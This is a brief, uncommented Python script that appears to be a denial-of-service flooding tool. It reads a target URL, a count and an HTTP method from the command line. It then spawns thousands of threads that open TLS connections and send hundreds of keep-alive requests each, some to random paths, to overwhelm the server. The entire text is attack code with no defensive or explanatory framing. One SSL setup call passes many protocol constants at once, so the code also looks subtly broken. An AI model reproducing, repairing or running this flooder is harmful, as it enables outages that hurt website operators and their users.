import socket,ssl,threading,struct,sys,random,string; from urllib.parse import urlparse
def get_target(parsed_url): return parsed_url.path or '/',parsed_url.netloc, parsed_url.port or ("443" if parsed_url.scheme == "https" else "80")
def Rapid_sender(s,byt):[s.write(byt[0]) for _ in range(500)]; [s.write(byt[1]) for _ in range(500)]
def Rapid(target,meth):[threading.Thread(target=Rapid_sender,args=(ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23).wrap_socket(socket.create_connection((target[1],int(target[2]))),server_hostname=target[1]),[f"{meth} {a} HTTP/1.1\nHost: {target[1]}\nConnection: Keep-Alive\n\n\r\r".encode()for a in ['/'+"".join(random.choices(string.ascii_letters+string.digits+string.punctuation, k=1)),target[0]]])).start()for _ in range(500)] 
[[threading.Thread(target=Rapid,args=(get_target(urlparse(sys.argv[1].rstrip())),sys.argv[3])).start() for x in range(10)] for _ in range(int(sys.argv[2]))]